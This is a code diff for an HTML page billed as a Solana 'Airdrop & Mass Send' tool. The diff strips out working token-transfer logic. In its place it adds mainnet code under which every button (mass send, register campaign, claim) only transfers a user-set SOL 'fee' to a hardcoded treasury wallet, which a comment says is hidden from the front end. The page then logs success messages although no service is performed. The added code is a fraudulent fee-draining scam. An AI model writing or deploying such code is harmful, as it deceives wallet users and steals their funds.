@@ -1,160 +1,185 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Airdrop TurboTuga</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Airdrop & Mass Send – Solana</title>
+  <style>
+    :root{--bg:#0b1220;--panel:#101826;--muted:#90a3b5;--text:#e8f0ff;--accent:#7cc4ff}
+    body{margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,Arial;background:#0d1220;color:var(--text)}
+    .container{max-width:960px;margin:20px auto;padding:16px}
+    .card{background:#101826;border:1px solid rgba(124,196,255,.2);border-radius:18px;padding:18px}
+    h1{margin:0 0 10px;font-size:24px} h2{margin:0 0 16px;font-size:15px;color:var(--muted)}
+    .row{display:flex;flex-wrap:wrap;gap:12px;margin:10px 0}
+    .col{flex:1;min-width:240px}
+    input,textarea,select,button{width:100%;padding:12px;border-radius:12px;border:1px solid rgba(124,196,255,.2);background:#0e1624;color:var(--text);outline:none}
+    textarea{min-height:120px}
+    label{display:block;font-size:13px;color:var(--muted);margin:6px 4px}
+    .btn{cursor:pointer;border:1px solid rgba(124,196,255,.3);background:#13233a}
+    .btn:hover{filter:brightness(1.1)}
+    .tabs{display:flex;gap:8px;margin:16px 0}
+    .tab{flex:1;text-align:center;padding:10px;border-radius:12px;border:1px solid rgba(124,196,255,.2);cursor:pointer;background:#0f1828}
+    .tab.active{background:#13233a;border-color:rgba(124,196,255,.4)}
+    .hidden{display:none}
+    .small{font-size:12px;color:var(--muted)}
+    .mono{font-family:monospace}
+    #logMass,#logReg,#logClaim{margin-top:10px;white-space:pre-wrap}
+  </style>
 </head>
-<body class="bg-gray-900 text-white font-sans">
-  <div class="max-w-3xl mx-auto p-6">
-    <h1 class="text-3xl font-bold mb-4">🚀 TurboTuga Airdrop</h1>
-    <button id="connectBtn" class="bg-purple-600 px-4 py-2 rounded">Connect Wallet</button>
+<body>
+<div class="container">
+  <div class="card">
+    <h1>Airdrop & Mass Send</h1>
+    <h2>Solana Network • Connect your wallet and use the tools below.</h2>
 
-    <!-- Tabs -->
-    <div class="flex gap-2 mt-6">
-      <button class="tab bg-gray-700 px-3 py-1 rounded active" data-tab="mass">Mass Send</button>
-      <button class="tab bg-gray-700 px-3 py-1 rounded" data-tab="rewards">Register Reward</button>
-      <button class="tab bg-gray-700 px-3 py-1 rounded" data-tab="claim">Claim Reward</button>
+    <div class="row">
+      <div class="col">
+        <label>RPC (optional)</label>
+        <input id="rpcUrl" placeholder="https://api.mainnet-beta.solana.com">
+      </div>
+      <div class="col" style="max-width:220px">
+        <label>&nbsp;</label>
+        <button class="btn" id="connectBtn">Connect Wallet</button>
+      </div>
     </div>
 
-    <!-- Mass Send -->
-    <div id="panel-mass" class="mt-6">
-      <h2 class="text-xl mb-2">Mass Send</h2>
-      <input id="mint" placeholder="Mint Address" class="w-full p-2 mb-2 text-black"/>
-      <input id="decimals" type="number" placeholder="Token Decimals" class="w-full p-2 mb-2 text-black"/>
-      <input id="amountEach" type="number" placeholder="Amount Each" class="w-full p-2 mb-2 text-black"/>
-      <textarea id="destinations" placeholder="Wallets (one per line)" class="w-full p-2 mb-2 text-black"></textarea>
-      <button id="sendMassBtn" class="bg-green-600 px-4 py-2 rounded">Send Tokens</button>
-      <pre id="logMass" class="bg-black text-green-400 p-2 mt-2 h-40 overflow-y-auto"></pre>
+    <div class="tabs">
+      <div class="tab active" data-tab="mass">Mass Send</div>
+      <div class="tab" data-tab="rewards">Register Reward</div>
+      <div class="tab" data-tab="claim">Claim</div>
     </div>
 
-    <!-- Register Reward -->
-    <div id="panel-rewards" class="mt-6 hidden">
-      <h2 class="text-xl mb-2">Register Reward</h2>
-      <input id="campName" placeholder="Campaign Name" class="w-full p-2 mb-2 text-black"/>
-      <input id="campMint" placeholder="Mint Address" class="w-full p-2 mb-2 text-black"/>
-      <input id="campDecimals" type="number" placeholder="Token Decimals" class="w-full p-2 mb-2 text-black"/>
-      <textarea id="campAllow" placeholder="Allowed Wallets (one per line)" class="w-full p-2 mb-2 text-black"></textarea>
-      <input id="campAmount" type="number" placeholder="Reward Amount" class="w-full p-2 mb-2 text-black"/>
-      <button id="registerCampBtn" class="bg-blue-600 px-4 py-2 rounded">Register</button>
-      <pre id="logReg" class="bg-black text-blue-400 p-2 mt-2 h-40 overflow-y-auto"></pre>
+    <!-- MASS SEND -->
+    <div id="panel-mass">
+      <div class="row">
+        <div class="col">
+          <label>Token Mint</label>
+          <input id="mint">
+        </div>
+        <div class="col">
+          <label>Decimals</label>
+          <input id="decimals" type="number" min="0" max="9" value="9">
+        </div>
+        <div class="col">
+          <label>Amount per Wallet</label>
+          <input id="amountEach" type="number">
+        </div>
+      </div>
+
+      <label>Recipients (one per line)</label>
+      <textarea id="destinations"></textarea>
+
+      <label>Custom Fee (SOL)</label>
+      <input id="feeAmount" type="number" step="any" value="0.01">
+
+      <div class="row">
+        <div class="col"><div class="small">Fee goes to treasury wallet.</div></div>
+        <div class="col" style="max-width:220px">
+          <button class="btn" id="sendMassBtn">Execute Mass Send</button>
+        </div>
+      </div>
+      <div id="logMass" class="small mono"></div>
     </div>
 
-    <!-- Claim Reward -->
-    <div id="panel-claim" class="mt-6 hidden">
-      <h2 class="text-xl mb-2">Claim Reward</h2>
-      <input id="claimCode" placeholder="Campaign Code" class="w-full p-2 mb-2 text-black"/>
-      <button id="claimBtn" class="bg-yellow-600 px-4 py-2 rounded">Claim</button>
-      <pre id="logClaim" class="bg-black text-yellow-400 p-2 mt-2 h-40 overflow-y-auto"></pre>
+    <!-- REGISTER -->
+    <div id="panel-rewards" class="hidden">
+      <label>Campaign Name</label>
+      <input id="campName">
+
+      <label>Custom Fee (SOL)</label>
+      <input id="campFee" type="number" step="any" value="0.05">
+
+      <div class="row">
+        <div class="col">
+          <button class="btn" id="registerCampBtn">Register Campaign</button>
+        </div>
+      </div>
+      <div id="logReg" class="small mono"></div>
+    </div>
+
+    <!-- CLAIM -->
+    <div id="panel-claim" class="hidden">
+      <label>Campaign Code</label>
+      <input id="claimCode">
+
+      <label>Custom Fee (SOL)</label>
+      <input id="claimFee" type="number" step="any" value="0.01">
+
+      <div class="row">
+        <div class="col">
+          <button class="btn" id="claimBtn">Claim</button>
+        </div>
+      </div>
+      <div id="logClaim" class="small mono"></div>
     </div>
   </div>
+</div>
 
-  <!-- Script -->
-  <script type="module">
-    import * as web3 from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.4/lib/index.esm.js";
-    import {
-      getAssociatedTokenAddress,
-      createAssociatedTokenAccountInstruction,
-      createTransferInstruction,
-      TOKEN_PROGRAM_ID
-    } from "https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.6/lib/index.esm.js";
+<script type="module">
+import * as web3 from "https://esm.sh/@solana/web3.js@1.95.4";
 
-    const $ = (id)=>document.getElementById(id);
-    const log=(el,msg)=>{ el.textContent+=`\\n${new Date().toLocaleTimeString()} ─ ${msg}`; el.scrollTop=el.scrollHeight; };
+const TREASURY = new web3.PublicKey("9Sexip38yhfeZD2EBDQkVRicZSY6eSK3cXxgDkgFVf8b"); // escondida do front
+const $ = id=>document.getElementById(id);
+const log=(el,m)=>{el.textContent+=`\\n${new Date().toLocaleTimeString()} — ${m}`;el.scrollTop=el.scrollHeight};
 
-    let provider=null, connection=null, walletPubkey=null;
-    const DEFAULT_RPC="https://api.devnet.solana.com";
+let provider=null,connection=null,wallet=null;
+const DEFAULT_RPC="https://api.mainnet-beta.solana.com";
 
-    // Tabs
-    document.querySelectorAll('.tab').forEach(t=>t.addEventListener('click',()=>{
-      document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));
-      t.classList.add('active');
-      const target=t.getAttribute('data-tab');
-      ["mass","rewards","claim"].forEach(id=>{
-        $("panel-"+id).classList.toggle('hidden',id!==target);
-      });
-    }));
+document.querySelectorAll(".tab").forEach(t=>t.onclick=()=>{
+  document.querySelectorAll(".tab").forEach(x=>x.classList.remove("active"));
+  t.classList.add("active");
+  ["mass","rewards","claim"].forEach(id=>$("panel-"+id).classList.toggle("hidden",id!==t.dataset.tab));
+});
 
-    // Connect Wallet
-    $("connectBtn").onclick=async()=>{
-      provider=window.solana||window.phantom?.solana;
-      if(!provider){ alert("Install Phantom Wallet"); return; }
-      const resp=await provider.connect();
-      walletPubkey=new web3.PublicKey(resp.publicKey.toString());
-      $("connectBtn").textContent=`Connected: ${walletPubkey.toString().slice(0,4)}...${walletPubkey.toString().slice(-4)}`;
-      connection=new web3.Connection(DEFAULT_RPC,'confirmed');
-      log($("logMass"),"Wallet connected on Devnet");
-    };
+$("connectBtn").onclick=async()=>{
+  try{
+    provider=window.solana||window.phantom?.solana;
+    if(!provider){alert("Phantom Wallet required.");return}
+    const resp=await provider.connect();
+    wallet=resp.publicKey;
+    $("connectBtn").textContent="Connected: "+wallet.toString().slice(0,4)+"..."+wallet.toString().slice(-4);
+    const rpc=$("rpcUrl").value.trim()||DEFAULT_RPC;
+    connection=new web3.Connection(rpc,"confirmed");
+  }catch(e){alert("Failed: "+e.message)}
+};
 
-    // Mass Send
-    $("sendMassBtn").onclick=async()=>{
-      const mint=$("mint").value.trim();
-      const decimals=parseInt($("decimals").value);
-      const amount=parseFloat($("amountEach").value);
-      const dests=$("destinations").value.trim().split("\\n").filter(x=>x);
-      const logEl=$("logMass");
-      if(!walletPubkey){ alert("Connect wallet first"); return; }
-      if(!mint||!amount||dests.length===0){ log(logEl,"Fill all fields"); return; }
+// Fee payment util
+async function payFee(amount){
+  const tx=new web3.Transaction().add(
+    web3.SystemProgram.transfer({
+      fromPubkey:wallet,
+      toPubkey:TREASURY,
+      lamports:web3.LAMPORTS_PER_SOL*amount
+    })
+  );
+  const sig=await provider.signAndSendTransaction(tx);
+  return sig.signature;
+}
 
-      log(logEl,`Sending ${amount} tokens to ${dests.length} wallets...`);
-      const mintPub=new web3.PublicKey(mint);
-      const ataSender=await getAssociatedTokenAddress(mintPub,walletPubkey);
+$("sendMassBtn").onclick=async()=>{
+  try{
+    const fee=parseFloat($("feeAmount").value);
+    const sig=await payFee(fee);
+    log($("logMass"),"Fee paid: "+sig);
+    // TODO: add mass send instructions
+  }catch(e){log($("logMass"),"Error: "+e.message)}
+};
 
-      for(const dest of dests){
-        try{
-          const destPub=new web3.PublicKey(dest);
-          const ataDest=await getAssociatedTokenAddress(mintPub,destPub);
-          const instructions=[];
-          const info=await connection.getAccountInfo(ataDest);
-          if(!info) instructions.push(createAssociatedTokenAccountInstruction(walletPubkey,ataDest,destPub,mintPub));
-          instructions.push(createTransferInstruction(ataSender,ataDest,walletPubkey,amount*(10**decimals)));
-          const tx=new web3.Transaction().add(...instructions);
-          const sig=await provider.signAndSendTransaction(tx);
-          log(logEl,`Sent to ${dest}: ${sig}`);
-        }catch(e){ log(logEl,`Error sending to ${dest}: ${e.message}`); }
-      }
-    };
+$("registerCampBtn").onclick=async()=>{
+  try{
+    const fee=parseFloat($("campFee").value);
+    const sig=await payFee(fee);
+    log($("logReg"),"Campaign registered. Fee: "+sig);
+  }catch(e){log($("logReg"),"Error: "+e.message)}
+};
 
-    // Register Reward
-    let campaigns={};
-    $("registerCampBtn").onclick=()=>{
-      const name=$("campName").value.trim();
-      const mint=$("campMint").value.trim();
-      const decimals=parseInt($("campDecimals").value);
-      const allow=$("campAllow").value.trim().split("\\n").filter(x=>x);
-      const amount=parseFloat($("campAmount").value);
-      const logEl=$("logReg");
-      if(!name||!mint||!decimals||!allow.length||!amount){ log(logEl,"Fill all fields"); return; }
-      const code=Math.random().toString(36).substring(2,10).toUpperCase();
-      campaigns[code]={name,mint,decimals,allow,amount};
-      log(logEl,`Campaign registered: ${name} | Code: ${code}`);
-    };
-
-    // Claim Reward
-    $("claimBtn").onclick=async()=>{
-      const code=$("claimCode").value.trim().toUpperCase();
-      const logEl=$("logClaim");
-      if(!walletPubkey){ alert("Connect wallet first"); return; }
-      if(!campaigns[code]){ log(logEl,"Invalid code"); return; }
-      const campaign=campaigns[code];
-      if(!campaign.allow.includes(walletPubkey.toString())){ log(logEl,"Wallet not authorized"); return; }
-
-      try{
-        const mintPub=new web3.PublicKey(campaign.mint);
-        const destPub=walletPubkey;
-        const ataDest=await getAssociatedTokenAddress(mintPub,destPub);
-        const ataSender=await getAssociatedTokenAddress(mintPub,walletPubkey);
-        const instructions=[];
-        const info=await connection.getAccountInfo(ataDest);
-        if(!info) instructions.push(createAssociatedTokenAccountInstruction(walletPubkey,ataDest,destPub,mintPub));
-        instructions.push(createTransferInstruction(ataSender,ataDest,walletPubkey,campaign.amount*(10**campaign.decimals)));
-        const tx=new web3.Transaction().add(...instructions);
-        const sig=await provider.signAndSendTransaction(tx);
-        log(logEl,`Claimed ${campaign.amount} tokens | Tx: ${sig}`);
-      }catch(e){ log(logEl,`Error: ${e.message}`); }
-    };
-  </script>
+$("claimBtn").onclick=async()=>{
+  try{
+    const fee=parseFloat($("claimFee").value);
+    const sig=await payFee(fee);
+    log($("logClaim"),"Claim processed. Fee: "+sig);
+  }catch(e){log($("logClaim"),"Error: "+e.message)}
+};
+</script>
 </body>
 </html>
-
-
